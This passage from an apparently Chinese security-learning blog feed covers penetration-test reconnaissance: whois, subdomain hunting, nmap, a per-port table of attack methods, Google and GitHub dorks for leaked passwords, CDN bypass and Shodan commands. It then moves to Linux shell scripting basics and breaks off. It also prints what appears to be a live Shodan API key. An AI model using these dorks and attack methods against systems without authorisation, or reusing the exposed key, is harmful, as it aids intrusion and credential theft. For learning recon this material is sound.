<li><a href="#6-%E7%9C%9F%E5%AE%9Eip%E5%9C%B0%E5%9D%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">6. 真实IP地址信息收集</a>
<ul>
<li><a href="#1-cdn%E4%BB%8B%E7%BB%8D">1. CDN介绍</a></li>
<li><a href="#2-%E5%88%A4%E6%96%ADcdn%E5%AD%98%E5%9C%A8">2. 判断CDN存在</a></li>
<li><a href="#3-%E7%BB%95%E8%BF%87cdn">3. 绕过CDN</a></li>
<li><a href="#4-%E9%AA%8C%E8%AF%81ip%E5%9C%B0%E5%9D%80">4. 验证IP地址</a></li>
</ul>
</li>
<li><a href="#7-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">7. 信息收集</a>
<ul>
<li><a href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">1. 信息收集</a></li>
<li><a href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E5%BC%8F">2. 信息收集方式</a></li>
</ul>
</li>
<li><a href="#8-shodan">8. Shodan</a>
<ul>
<li><a href="#1-shodan%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8">1. Shodan基本使用</a></li>
<li><a href="#2-shodan%E5%91%BD%E4%BB%A4%E8%A1%8C">2. Shodan命令行</a></li>
</ul>
</li>
</ul>
(信息收集)</p>
<h1 id="1域名信息收集">1.域名信息收集</h1>
<h2 id="1-域名介绍">1. 域名介绍</h2>
<ol>
<li>域名（Domain Name），是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。在开始时，没有域名，要访问只能通过IP地址访问。
<ul>
<li>eg：百度：baidu.com，www为主机名</li>
<li>浏览网站的过程：（PC发送对应请求从DNS服务器获得的指定域名对应的IP地址，后通过IP地址访问网站）</li>
</ul>
</li>
</ol>
<h2 id="2-whois介绍">2. Whois介绍</h2>
<ol>
<li>Whois，是用来查询域名的IP以及所有者等信息的传输协议，就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库。不同的域名后缀的Whois信息需要用到不同的Whois数据库查询，每个域名或IP的Whois信息由对应的管理机构保存。</li>
<li>Whois，他的基本过程：先向服务器的TCP端口43建立一个连接，发送要查询的数据给Whois服务器，后接收服务器的查询结果。</li>
</ol>
<h2 id="3-whois查询">3. Whois查询</h2>
<ol>
<li>Whois查询的重要性：通过Whois查询可以获得域名注册者邮箱地址等信息。一般情况下对于中小型网站来说域名注册者就是网站管理员。利用搜索引擎对Whois查询到的信息进行搜索，获取更多域名注册者的个人信息。</li>
<li>Whois查询方法：<br>
1、Web接口查询：</li>
</ol>
<ul>
<li>https://whois.aliyun.com/、</li>
<li>https://www.whois365.com/cn/</li>
<li>http://whois.chinaz.com/、</li>
<li>https://whois.aizhan.com/<br>
2、通过Whois命令行查询。</li>
<li>在Kali linux下自带了Whois查询工具，通过命令whois域名 进行查询。</li>
<li>whois [域名]</li>
</ul>
<h2 id="4-备案信息查询">4. 备案信息查询</h2>
<ol>
<li>ICP备案介绍：（Internet Content Provider）网络内容提供商。<br>
《互联网信息服务管理办法》指出互联网信息服务分为经营性和非经营性两类。国家对经营性互联网信息服务实行许可制度；对非经营性互联网信息服务实行备案制度。未取得许可或者未履行备案手续的，不得从事互联网信息服务。在中华人民共和国境内提供非经营性互联网信息服务，应当依法履行备案手续。未经国家机关单位许可备案，不得在中华人民共和国境内从事非经营性互联网信息服务。</li>
<li>备案好处：为了防止在网上从事非法的网站经营活动，打击不良互联网信息的传播，如果网站不备案的话，很有可能被查处以后关停。</li>
<li>ICP备案查询方法：</li>
</ol>
<ul>
<li>Web接口查询：
<ul>
<li>http://www.beianbeian.com/</li>
<li>http://www.miitbeian.gov.cn/publish/query/indexFirst.action</li>
<li>https://www.tianyancha.com/</li>
</ul>
</li>
</ul>
<h1 id="2-子域名信息收集">2. 子域名信息收集</h1>
<h2 id="1-子域名介绍">1. 子域名介绍</h2>
<ol>
<li>顶级域名：是“.com&quot;、&quot;.net&quot;、&quot;.org”、&quot;.cn&quot;等等。</li>
<li>子域名(Subdomain Name)，凡顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据技术的多少分为二级子域名，三级子域名以及多级子域名。我国在国际互联网络信息中心正式注册并运行的顶级域名是.cn，这也是我国的一级域名。</li>
<li>在顶级域名之下，我国的二级域名又分为类别域名和行政区域名两类。类别域名共6个， 包括用于科研机构的.ac；用于工商金融企业的.com；用于教育机构的.edu；用于政府部门的.gov；用于互联网络信息中心和运行中心的.net；用于非盈利组织的.org。而行政区域名有34个，分别对应于我国各省、自治区和直辖市。</li>
<li>例如：www.snnu.edu.cn</li>
</ol>
<h2 id="2-挖掘子域名重要性">2. 挖掘子域名重要性</h2>
<ol>
<li>子域名是某个主域的二级域名或者多级域名，在防御措施严密情况下无法直接拿下主域，那么就可以采用迂回战术拿下子域名，然后无限靠近主域。</li>
<li>例如：</li>
</ol>
<ul>
<li>www.xxxxx.com主域不存在漏洞，并且防护措施严密。</li>
<li>而二级域名 edu.xxxxx.com存在漏洞，并且防护措施松散。</li>
</ul>
<h2 id="3-子域名挖掘方法">3. 子域名挖掘方法</h2>
<ol>
<li>子域名挖掘工具 如：Maltego CE，wydomain，subDomainBrute，dnsmaper，Layer子域名挖掘机等等。</li>
<li>实例演示：</li>
</ol>
<h2 id="4-刷洞思路">4. 刷洞思路</h2>
<ol>
<li>针对某个具体SRC进行挖洞，如果直接针对主域进行渗透测试很可能是很难达到挖掘的效果。此时可以<br>
搜集对应的子域名，然后批量探测某些具体漏洞，从而更加快速容易的发现一些漏洞。之后将漏洞提交对应SRC获取奖金。</li>
<li>针对补天刷洞思路：对应没有指定厂商的刷洞，可以根据某些具体漏洞，通过URL采集获取目标，编写探测脚本批量探测，快速高效的刷洞。</li>
<li>注意：无论如何，都要保持警惕，不要触及不该触及的内容，不要影响公司业务，只做漏洞探测内容，确定存在漏洞即可。适可而止。</li>
<li>挖洞高峰期：在互联网上曝出某些新漏洞的时候，会有大量的该漏洞提交到漏洞平台获取奖金。</li>
</ol>
<h1 id="3-web站点信息收集">3. web站点信息收集</h1>
<h2 id="1-cms指纹识别">1. CMS指纹识别</h2>
<ol>
<li>CMS为内容管理系统，又称为整站系统或文章系统，通常用于网站内容管理。用户可以通过下载对应的CMS管理器软件包，通过部署搭建，可以很快地建立起一个内容管理系统，方便快捷。但是通常各种CMS都具有独特的结构命名规则和特定的软件文件内容，因此可以利用这些特定的内容来获取CMS站点的具体软件CMS与版本。</li>
<li>常见CMS：dedecms（织梦），Discus（用于论坛），Phpcms等。</li>
<li>CMS识别工具：</li>
</ol>
<ul>
<li>在线工具：</li>
<li>（http://whatweb.bugscaner.com/look/，http://www.yunsee.cn/finger.html）</li>
<li>本地工具：</li>
<li>whatweb，</li>
<li>御剑web指纹识别程序（https://pan.baidu.com/share/link?shareid=437376&amp;uk=3526832374）</li>
<li>大禹CMS识别程序（https://github.com/Ms0x0/Dayu）</li>
</ul>
<h2 id="2-针对cms漏洞查询">2. 针对CMS漏洞查询</h2>
<ul>
<li>对于查询到的CMS可以用https://bugs.shuimugan.com（失效）网站查询指定CMS的漏洞。</li>
</ul>
<h2 id="3-敏感目录信息">3. 敏感目录信息</h2>
<ol>
<li>针对目标Web目录结构和敏感隐藏文件探测是非常重要的。在探测过程中很用可能会探测出后台页面，上传页面，数据库文件，甚至是网站源代码文件压缩包等等。</li>
<li>探测工具：</li>
</ol>
<ul>
<li>御剑后台扫描工具</li>
<li>wwwscan命令行工具</li>
<li>dirb命令行工具（kali）</li>
<li>dirbuster扫描工具（kali）</li>
</ul>
<h2 id="4-wordpress测试wpscankali">4. wordpress测试（wpscan）(kali)</h2>
<h1 id="4-端口信息收集">4. 端口信息收集</h1>
<h2 id="1-端口介绍">1. 端口介绍</h2>
<ol>
<li>如果将IP比作一个房子，端口就是进出这个房子的门。一个IP可以有65536个端口（2^16）。端口是通过端口号来标记的，端口号只有整数，范围是从0到65535。</li>
<li>在计算机中一个端口代表一个服务，windows命令行可以使用netstat -anbo显示开放端口。</li>
</ol>
<h2 id="2-端口信息收集">2. 端口信息收集</h2>
<ol>
<li>对于收集的目标机器的端口状态可以使用工具来进行测试。原理：使用TCP或者UDP等协议向目标端口发送指定标志位等的数据包，接受目标返回的数据包，通过这些返回的数据包来进行判断端口的状态。</li>
<li>工具：</li>
</ol>
<ul>
<li>使用nmap(kali)探测。nmap -A -v -T4 [目标]</li>
<li>也可以使用masscan(kali)。</li>
<li>在线网站：http://tool.chinaz.com/port/</li>
</ul>
<h2 id="3-端口攻击乌云查询等等">3. 端口攻击（乌云查询等等）</h2>
<ol>
<li>不同的端口有不同的攻击方法。</li>
</ol>
<ul>
<li>针对远程连接服务端口。</li>
<li>端口 | 端口说明 | 攻击方法</li>
<li>22 | SSH远程连接  | 爆破、SSH隧道及内网代理转发、文件传输</li>
<li>23 | Telnet远程连接 | 爆破、嗅探、弱口令</li>
<li>3389 | rdp远程桌面 | Shift后门、爆破</li>
<li>5900  | VNC远程连接 | 弱口令、RCE</li>
<li>5632 | PcAnywhere远程连接 | 嗅探、代码执行</li>
</ul>
<h2 id="4-防御措施">4. 防御措施</h2>
<ol>
<li>对于端口攻击来说只要端口开放并且可以连通，那么就可以利用对应的方式进行攻击测试。</li>
<li>防御措施：</li>
</ol>
<ul>
<li>关闭不必要的端口；</li>
<li>对重要业务的服务端口设置防火墙：</li>
<li>加强员工信息安全意识，经常性更换用户密码；</li>
<li>经常更新软件，打补丁(patch)。</li>
</ul>
<h1 id="5-敏感信息收集">5. 敏感信息收集</h1>
<h2 id="1-敏感信息收集重要性">1. 敏感信息收集重要性</h2>
<ol>
<li>针对某些安全做的很好的目标，直接通过技术层面是无法完成渗透测试。在这种情况下，可以利用搜索<br>
引擎搜索目标暴露在互联网上的关联信息。例如：数据库文件、SQL注入、服务器配置信息、甚至是通<br>
过Git找到站点泄露源代码、以及Redis等未授权访问、robots.txt等敏感信息。从而达到渗透测试的目的。</li>
<li>知己知彼，百战不殆。某些情况下，收集到的信息会对后期进行测试起到帮助重要。如果通过收集敏感<br>
信息直接获得了目标系统的数据库访问权限，那么渗透测试任务也就结束一大半了。因此在进行技术层<br>
面情况下的测试之前，应该先进行更多的信息收集。</li>
</ol>
<h2 id="2-google-hacking语法">2. Google Hacking语法</h2>
<ol>
<li>google hack是指使用Google等搜索引擎对某些特定的网络主机漏洞(通常是服务器上的脚本漏洞)进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。</li>
<li>关键字 | 含义</li>
</ol>
<ul>
<li>site | 指定搜索域名 例如：site:baidu.com</li>
<li>inurl | 指定URL中是否存在某些关键字 例如：inurl:.php?id=</li>
<li>intext | 指定网页中是否存在某些关键字 例如：intext：网站管理</li>
<li>filetype | 指定搜索文件类型 例如：filetype:txt</li>
<li>intitle | 指定网页标题是否存在某些关键字 例如：intitle：后台管理</li>
<li>link | 指定网页链接 例如：link：baidu.com 指定与百度做了外链的站点</li>
<li>info | 指定搜索网页信息 info：baidu.com</li>
</ul>
<ol start="3">
<li>Google hacking数据库：https://www.exploit-db.com/google-hacking-database/</li>
<li>例如：查询Access数据：filetype:mdb &quot;standard jet&quot;(password | username | user  pass)</li>
</ol>
<h2 id="3-http响应收集server信息">3. HTTP响应收集Server信息</h2>
<ol>
<li>通过HTTP或HTTPS与目标站点进行通信中，目标响应的报文中Server头和X-Powered-By头会暴露目标服务器和使用的编程语言信息，通过这些信息可以有针对的利用漏洞尝试。</li>
<li>获取HTTP响应的方法：</li>
</ol>
<ul>
<li>利用工具如：浏览器审计工具、Burpsuite等代理截断工具。</li>
<li>编写Python脚本requests库 参考链接：http://www.python-requests.org/en/master/</li>
</ul>
<pre><code>import requests
r = requests.get('目标')
print(r.headers)
</code></pre>
<h2 id="4-github信息泄露">4. Github信息泄露</h2>
<ol>
<li>Github是一个分布式的版本控制系统，目前拥有140多万开发者用户。随着越来越多的应用程序转移到了云上，Github已经成为了管理软件开发以及发现已有代码的首选方法。众所周知，当今是大数据时代，大规模数据泄露事情一直在发生，从未停止过，但有些人不知道的是很多时候一些敏感信息的泄露其实是我们自己无意中造成的，然而一个小疏忽，往往却造成一系列连锁反应。Github上敏感信息的泄露，就是一个典型的例子，Github虽然方便开发者，但其中也埋藏着一些安全隐患。</li>
</ol>
<ul>
<li>Github之邮件配置信息泄露：site:Github.com smtp、site:Github.com smtp @qq.com</li>
<li>Github之数据库信息泄露：site:Github.com sa password、site:Github.com root password、site:Github.com User ID=’sa’;Password</li>
<li>Github之svn信息泄露：site:Github.com svn、site:Github.com svn username</li>
<li>Github之综合信息泄露：site:Github.com password、site:Github.com ftp ftppassword、<br>
site:Github.com 密码、site:Github.com 内部</li>
</ul>
<h1 id="6-真实ip地址信息收集">6. 真实IP地址信息收集</h1>
<h2 id="1-cdn介绍">1. CDN介绍</h2>
<ol>
<li>CDN全称（Content Delivery Network），即内容分发网络。</li>
<li>一些大型网站会拥有很多用户，而用户时常会向网站发送一些请求，不同地域有不同的缓冲服务器，用来接收用户发送的流量，如果用户发送的流量没有任何的交互数据，只是请求一个页面的话，这时用户可以根据所在地区来确定访问的缓冲服务器，那么这个高速缓冲服务器就会返回对应的响应到用户的浏览器中。</li>
<li>只有交互时才能请求真实服务器。</li>
</ol>
<h2 id="2-判断cdn存在">2. 判断CDN存在</h2>
<ol>
<li>CDN一般存在于大型网站（用户流量特别多），通过CDN可以解决服务器性能的瓶颈。</li>
<li>通过ping判断是否存在CDN（ping www.baihe.com）存在CDN。</li>
<li>通过设置代理或者利用在线ping网站来使用不同地区的ping服务器来测试目标。（http://ping.chinaz.com）</li>
</ol>
<h2 id="3-绕过cdn">3. 绕过CDN</h2>
<ol>
<li>如果目标没有使用CDN，可以直接利用ping获得IP地址。或者利用在线网站（http://www.ip138.com）</li>
<li>如果目标使用CDN，需要绕过CDN来获取真实IP地址。<br>
1、内部邮箱源 收集到内部邮箱服务器IP地址<br>
2、网站phpinfo文件phpinfo.php<br>
3、分站IP地址，查询子域名 CDN很贵，很有可能分站就不再使用CDN。<br>
4、国外访问 https://asm.ca.com/en/ping.php<br>
5、查询域名解析记录 https://viewdns.info/</li>
</ol>
<h2 id="4-验证ip地址">4. 验证IP地址</h2>
<p>利用IP地址对Web站点进行访问，如果正常表明是真实IP地址，否则不真。可能因为浏览器的原因访问的是空白的页面，有时会出来图标标明是真实的IP地址。</p>
<h1 id="7-信息收集">7. 信息收集</h1>
<h2 id="1-信息收集">1. 信息收集</h2>
<ol>
<li>信息收集在渗透测试中是重中之重，对于目标的信息收集，主要针对目标服务器系统，数据库系统，中间件系统，应用程序系统，以及边界设备等信息，以及收集针对于系统管理员的信息收集。</li>
</ol>
<h2 id="2-信息收集方式">2. 信息收集方式</h2>
<ol>
<li>主动信息收集：直接与目标进行交互，通过对交互过程中的信息进行收集。</li>
</ol>
<ul>
<li>Nmap扫描，Burpsuite站点地图收集等。</li>
</ul>
<ol start="2">
<li>被动信息收集：通过第三方引擎与目标进行交互，或不予目标交互查询具体数据库，获的目标信息。</li>
</ol>
<ul>
<li>Google Hacking，Shodan查询等。</li>
</ul>
<h1 id="8-shodan">8. Shodan</h1>
<h2 id="1-shodan基本使用">1. Shodan基本使用</h2>
<ol>
<li>搜索摄像头命令：webcam</li>
<li>搜索开放指定端口的服务器：port：XXX</li>
<li>搜索指定的IP地址信息：host：XXX.XXX.XXX.XXX</li>
<li>搜索具体城市开放的具体端口的一些设备：city：XXXXX port：XXX</li>
</ol>
<h2 id="2-shodan命令行">2. Shodan命令行</h2>
<ol>
<li>kali安装Shodan命令行：easy_install shodan</li>
<li>Shodan初始化：shodan init [API Key]</li>
</ol>
<ul>
<li>初始化Shodan就是给Shodan初始化API Key。[API Key：hHg9HmLgZuqBc1VsNqWGd10ilpyveeesb].</li>
<li>这个API Key在自己登陆Shodan页面之后的右上角。</li>
</ul>
<ol start="3">
<li>Shodan启动与查询具体服务数量</li>
</ol>
<ul>
<li>shodan count Apache(可以查询开放了Apache服务在Shodan中的具体数量)</li>
<li>shodan count Tomcat</li>
</ul>
<ol start="4">
<li>Shodan命令行搜索功能</li>
</ol>
<ul>
<li>利用 shodan search microsoft iis 6.0</li>
</ul>
<ol start="5">
<li>Shodan获取指定IP地址信息</li>
</ol>
<ul>
<li>shodan host [ip地址]</li>
</ul>
<ol start="6">
<li>Shodan获取自己shodan账号信息（会员）</li>
</ol>
<ul>
<li>shodan info</li>
</ul>
<ol start="7">
<li>Shodan获取自身外部可见IP地址</li>
</ol>
<ul>
<li>shodan myip</li>
</ul>
<ol start="8">
<li>Shodan检测是否有蜜罐保护<br>
shodan honeyscore [目标IP]</li>
<li>python-shodan（使用python引入shodan）</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[1. 网络攻击]]></title>
        <id>https://kite-007.github.io/1-wang-luo-gong-ji/</id>
        <link href="https://kite-007.github.io/1-wang-luo-gong-ji/">
        </link>
        <updated>2021-03-13T11:49:29.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB">1. 拒绝服务攻击</a>
<ul>
<li><a href="#dos%E6%94%BB%E5%87%BB">Dos攻击</a></li>
</ul>
</li>
</ul>
(网络攻击)</p>
<h1 id="1-拒绝服务攻击">1. 拒绝服务攻击</h1>
<p><strong>定义：攻击者会想办法让目标停止服务。通常是对目标网络资源上的消耗，使目标的服务器被暂停或者宕机等一系列能够给目标造成麻烦的后果的攻击方式。拒绝服务攻击一直得不到解决，其根本原因是由于网络协议本身的缺陷造成的。攻击者进行拒绝服务攻击，通常有两种效果：一个是迫使服务器的缓冲区溢满，不再接受新的请求，二是使用IP欺骗，迫使服务器把合法的用户的连接复位，影响正常用户的链接</strong></p>
<h2 id="dos攻击">Dos攻击</h2>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# Linux（Shell编程）]]></title>
        <id>https://kite-007.github.io/linuxji-chu-xia-pian/</id>
        <link href="https://kite-007.github.io/linuxji-chu-xia-pian/">
        </link>
        <updated>2021-03-11T11:20:09.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-shell%E4%BB%8B%E7%BB%8D">1. Shell介绍：</a></li>
<li><a href="#2-shell%E8%84%9A%E6%9C%AC%E7%9A%84%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F">2. Shell脚本的执行方式：</a></li>
<li><a href="#3-shell%E5%8F%98%E9%87%8F">3. Shell变量</a></li>
<li><a href="#4-%E8%AE%BE%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">4. 设置环境变量</a></li>
<li><a href="#5-%E4%BD%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E5%8F%98%E9%87%8F">5. 位置参数变量</a></li>
<li><a href="#6-%E9%A2%84%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F">6. 预定义变量</a></li>
<li><a href="#7-%E8%BF%90%E7%AE%97%E7%AC%A6">7. 运算符</a></li>
<li><a href="#8-%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD">8. 条件判断</a></li>
<li><a href="#9-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6">9. 流程控制</a></li>
<li><a href="#10-read%E8%AF%BB%E5%8F%96%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%85%A5">10. read读取控制台输入</a></li>
<li><a href="#11-%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0">11. 自定义函数</a></li>
<li><a href="#12-%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0">12. 系统函数</a></li>
</ul>
(Linux)</p>
<h1 id="1-shell介绍">1. Shell介绍：</h1>
<p><strong>Shell是一个命令行解释器，提供了一个向Linux内核发送请求以便运行程序的界面系统级程序，用户可以用Shell来启动，挂起，停止甚至编写一些程序。在进行服务集群管理时，需要编写Shell程序来进行服务器管理。</strong><br>
<img src="https://kite-007.github.io/post-images/1615466696793.png" alt="" loading="lazy"></p>
<h1 id="2-shell脚本的执行方式">2. Shell脚本的执行方式：</h1>
<ol>
<li>脚本的格式要求：
<ol>
<li>脚本以#!/bin/bash开头</li>
<li>脚本需要有可执行权限</li>
</ol>
<ul>
<li>编写shell：helloworld
<ul>
<li><img src="https://kite-007.github.io/post-images/1615467173469.png" alt="" loading="lazy"></li>
<li>创建一个文件shellcode专门用来存放shell</li>
<li>注意要赋予.sh文件的执行权限</li>
<li><img src="https://kite-007.github.io/post-images/1615467574630.png" alt="" loading="lazy"></li>
<li>hello.sh：</li>
</ul>
</li>
</ul>
</li>
</ol>
<pre><code>  #!/bin/bash
  echo &quot;helloworld!&quot;
</code></pre>
<h1 id="3-shell变量">3. Shell变量</h1>
<ol>
<li>Shell变量介绍：
<ol>
<li>Linux变量分为：系统变量和用户自定义变量。</li>
<li>系统变量：￥HOME、￥PATH、￥SHELL、￥USER等等（$符号被转义）。</li>
<li>显示当前shell中的所有变量：set。</li>
</ol>
</li>
<li>shell变量的定义：
<ol>
<li>变量可以由数字字母下划线组成，但是不能以数字开头。</li>
<li>等号两边不能有空格</li>
<li>变量名称一般习惯大写</li>
</ol>
<ul>
<li>将命令的返回值赋给变量：</li>
<li>A=<code>date</code> 反引号，运行里面的命令，并把结果返回给A</li>
<li>A=$(date)等价于反引号</li>
</ul>
</li>
<li>shell变量的定义：
<ol>
<li>定义变量：变量名=值；注意不能有空格。</li>
<li>撤销变量：unset 变量。</li>
<li>静态变量：readonly变量；注意，不能unset</li>
</ol>
<ul>
<li>var.sh:</li>
</ul>
</li>
</ol>
<pre><code>#!/bin/bash
#!/bin/bash
#定义变量：
A=100
#输出变量需要加$符号
echo $A
echo A=$A
echo &quot;A=$A&quot;
#撤销变量：unset 变量
unset A
echo A=$A
#静态变量：注意，不能unset
readonly B=1
echo B=$B
#unset B
echo C=`date`
</code></pre>
<h1 id="4-设置环境变量">4. 设置环境变量</h1>
<ol>
<li>基本语法：
<ol>
<li>export 变量名=变量值（将shell变量输出为环境变量/全局变量）</li>
<li>source 配置文件（让修改后的配置信息立即生效）</li>
<li>echo $变量名（查询环境变量的值）</li>
</ol>
</li>
<li>说明：
<ol>
<li>环境变量可以和多个文件共享</li>
<li>每次配置完环境变量需要用source命令进行刷新，否则无效</li>
<li>shell多行注释：（：&lt;&lt;!Enter内容Enter！）</li>
</ol>
</li>
</ol>
<h1 id="5-位置参数变量">5. 位置参数变量</h1>
<ul>
<li>当执行一个shell脚本时，如果想要得到命令行的参数信息，就可以使用到位置参数变量</li>
<li>案例：./myshell.sh 100 200，可以在myshell.sh中获取到参数信息</li>
<li>基本语法：
<ul>
<li>$n：（n为数字，0代表命令本身，1-9代表第一到九个参数，从第十个开始，参数需要用到大括号包含，例如：{10}）</li>
<li>$*：（代表命令行中所有的参数，它把所有的参数看成一个整体）</li>
<li>$@：（这个也代表所有的参数，不过它把每个参数区分对待）</li>
<li>$#：（代表命令行中所有参数的个数）</li>
<li>myshell.sh :命令：./myshell.sh 100 200</li>
</ul>
</li>
</ul>
<pre><code>#/bin/bash
echo &quot;$0 $1 $2 $3&quot;
echo &quot;$*&quot;
echo &quot;$@&quot;
echo &quot;$#&quot;
</code></pre>
<h1 id="6-预定义变量">6. 预定义变量</h1>
<ol>
<li>介绍：
<ol>
<li>就是shell设计者事先已经设置好的变量，可以直接再shell脚本中使用</li>
</ol>
</li>
<li>基本语法：
<ol>
<li>两个$（当前的进程号(PID)）</li>
<li>$!（后台运行的最后一个进程的进程号(PID)）在命令后面加&amp;表示后台执行</li>
<li>$?（最后一次执行的命令的返回状态。如果是0表示上一个命令正确执行，如果是非0(具体是哪个数由命令决定)，则反之）</li>
</ol>
</li>
</ol>
<h1 id="7-运算符">7. 运算符</h1>
<ol>
<li>shell的各种运算操作
<ol>
<li>基本语法：
<ol>
<li>&quot;$((运算式))&quot;或&quot;$[运算式]&quot;或expr m + n //expression表达式</li>
<li>特别注意：expr运算符之间要有空格，如果希望将expr的结果赋给某个变量，使用``(反引号括起)</li>
<li>expr *，/，% 乘，除，取余</li>
</ol>
</li>
<li>案例：operator.sh</li>
</ol>
</li>
</ol>
<pre><code>#/bin/bash
#案例1：计算（2+3）X4的值
#方式一：
RESULT1=$(((2+3)*4))
echo &quot;RESULT1=$RESULT1&quot;
#方式二：推荐使用
RESULT2=$[(2+3)*4]
echo &quot;RESULT2=$RESULT2&quot;
#方式三：
RESULT3=`expr 2 + 3`
RESULT4=`expr $RESULT3 \* 4`
echo &quot;RESULT3=$RESULT3&quot;
echo &quot;RESULT4=$RESULT4&quot;
#将命令行的两个参数的和
echo &quot;RESULT=$[($1+$2)*$3]&quot;
</code></pre>
<h1 id="8-条件判断">8. 条件判断</h1>
<ol>
<li>条件判断语句：
<ol>
<li><a href="%E7%89%B9%E5%88%AB%E6%B3%A8%E6%84%8F%EF%BC%9Acondition%E7%9A%84%E5%89%8D%E5%90%8E%E8%A6%81%E6%9C%89%E7%A9%BA%E6%A0%BC"> condition </a></li>
<li>非空返回true，可以使用$?验证（0为true，&gt;1为false）</li>
<li>[ condition ] &amp;&amp; echo OK || echo notok，条件满足执行后面的语句</li>
</ol>
</li>
<li>条件判断选项<br>
1.</li>
<li>判断语句：</li>
</ol>
<pre><code>if [ 判断 ]
then
    语句
fi
</code></pre>
<ol start="4">
<li>案例：ifdemo.sh</li>
</ol>
<pre><code>#/bin/bash
#案例1：&quot;OK&quot;是否等于&quot;OK&quot;
if [ &quot;OK&quot; = &quot;OK&quot; ]
then
        echo &quot;equal&quot;
fi
#案例2：23是否大于22
if [ 23 -ge 22 ]
then
        echo &quot;大于&quot;
fi
#案例3：/root/shellcode/hello.sh文件是否存在
if [ -f /root/shellcode/hello.sh ]
then
        echo &quot;存在该文件&quot;
fi
</code></pre>
<h1 id="9-流程控制">9. 流程控制</h1>
<ol>
<li>单分支if
<ol>
<li>if [ 条件判断式 ]</li>
<li>then</li>
<li>代码语句</li>
<li>fi（结束标志）</li>
</ol>
</li>
<li>多分支if
<ol>
<li>if [ 条件判断式 ]</li>
<li>then</li>
<li>代码语句</li>
<li>elif</li>
<li>then</li>
<li>代码语句</li>
<li>fi（结束标志）</li>
</ol>
</li>
<li>case语句
<ol>
<li>case $变量名 in</li>
<li>&quot;值1&quot;)</li>
<li>如果变量的值等于值1，则执行程序1</li>
<li>;;（表示一个语句分支的结束）</li>
<li>&quot;值2&quot;)</li>
<li>如果变量的值等于值2，则执行程序2</li>
<li>;;（表示一个语句分支的结束）</li>
<li>省略其他分支</li>
<li>*)</li>
<li>如果变量的值都不是以上的值，则执行此程序</li>
<li>;;</li>
<li>esac（总结束的标志）</li>
</ol>
</li>
<li>for语句
<ol>
<li>for [变量] in 值1 值2。。。</li>
<li>do</li>
<li>代码</li>
<li>done</li>
</ol>
</li>
<li>for语句（传统）
<ol>
<li>for (( 初始值;循环控制条件;变量变化 ))</li>
<li>do</li>
<li>代码</li>
<li>done</li>
</ol>
</li>
<li>while语句
<ol>
<li>while [ 条件判断 ]</li>
<li>do</li>
<li>代码</li>
<li>done</li>
</ol>
</li>
</ol>
<h1 id="10-read读取控制台输入">10. read读取控制台输入</h1>
<ol>
<li>基本语法：
<ol>
<li>read 选项 &quot;&quot; 参数</li>
<li>-p：指定读取时的提示符</li>
<li>-t X：指定读取时等待的时间（X秒），如果没有在等待的时间输入，就不再等待了。</li>
<li>变量：指定读取值的变量名</li>
</ol>
</li>
</ol>
<h1 id="11-自定义函数">11. 自定义函数</h1>
<ol>
<li>基本语法：
<ol>
<li>[ function ] funname[()]</li>
<li>{</li>
<li>
<pre><code>Action;
</code></pre>
</li>
<li>
<pre><code>[return int;]
</code></pre>
</li>
<li>}</li>
<li>调用：funname [值]</li>
<li>案例：getsum.sh</li>
</ol>
</li>
</ol>
<pre><code>#!/bin/bash
#案例：计算两个参数的和（动态的方式获取），getSum
#定义函数getSum
function getSum() {
        sum=$[$n1+$n2]
        echo &quot;和sum=$sum&quot;
}
#输入两个值
read -p &quot;请输入一个数n1=&quot; n1
read -t 10 &quot;请输入一个数n2=&quot; n2
#调用自定义函数
getSum $n1 $n2
</code></pre>
<h1 id="12-系统函数">12. 系统函数</h1>
<ol>
<li>basename函数
<ol>
<li>basename：返回完整路径最后/的后面部分，常用于获取文件名</li>
<li>如果输入basename /root/shellcode/hello.sh</li>
<li>返回hello.sh</li>
<li>如果输入basename /root/shellcode/hello.sh .sh</li>
<li>则返回hello</li>
</ol>
</li>
<li>dirname函数
<ol>
<li>dirname：返回完整路径最后/的前面部分，常用于返回路径部分</li>
<li>如果输入dirname /root/shellcode/hello.sh</li>
<li>则会返回/root/shellcode</li>
</ol>
</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# Linux网络配置]]></title>
        <id>https://kite-007.github.io/linux-wang-luo-pei-zhi/</id>
        <link href="https://kite-007.github.io/linux-wang-luo-pei-zhi/">
        </link>
        <updated>2021-03-09T13:09:11.000Z</updated>
        <content type="html"><![CDATA[<ol>
<li>
<p>第一种方式：（自动获取）</p>
<ul>
<li>登陆后通过界面的设置来进行网络IP的自动获取，好处就是会自动避免IP冲突，缺点则是每次获取的IP可能不一样。工作时需要固定的IP做服务器，所以工作环境不能用。</li>
<li>查看是否为自动获取或者设置：</li>
<li><img src="https://kite-007.github.io/post-images/1615295824550.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1615295835112.png" alt="" loading="lazy"></li>
</ul>
</li>
<li>
<p>第二种方式：（指定IP）<br>
